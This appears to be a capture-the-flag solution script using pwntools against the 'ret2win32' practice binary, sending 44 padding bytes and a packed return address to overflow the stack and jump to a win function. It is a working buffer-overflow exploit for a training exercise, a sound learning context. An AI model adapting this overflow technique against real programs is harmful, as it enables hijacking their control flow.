#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

elf = ELF("./ret2win32")
sh = process("./ret2win32")

ret2win = 0x08048659

payload = ""
payload += "A"*44
payload += p32(ret2win)

sh.sendline(payload)
sh.interactive()